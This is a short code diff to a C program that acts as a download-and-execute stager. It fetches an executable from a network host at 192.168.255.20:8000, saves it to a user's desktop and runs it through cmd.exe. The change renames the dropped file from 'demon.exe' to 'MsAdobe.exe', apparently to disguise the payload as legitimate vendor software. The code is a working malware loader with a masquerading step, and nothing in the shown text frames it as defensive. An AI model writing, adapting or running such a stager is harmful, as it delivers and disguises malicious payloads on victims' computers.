@@ -12,9 +12,9 @@
 
 int main()
 {
-	const char* filename = "c:\\Users\\saurav\\Desktop\\demon.exe";
+	const char* filename = "c:\\Users\\saurav\\Desktop\\MsAdobe.exe";
 	URLDownloadToFile(NULL, "http://192.168.255.20:8000/demon.exe", filename, 0, NULL);
-	system("cmd.exe /c c:\\Users\\saurav\\desktop\\demon.exe");
+	system("cmd.exe /c c:\\Users\\saurav\\desktop\\MsAdobe.exe");
 
 	return 0;
 	
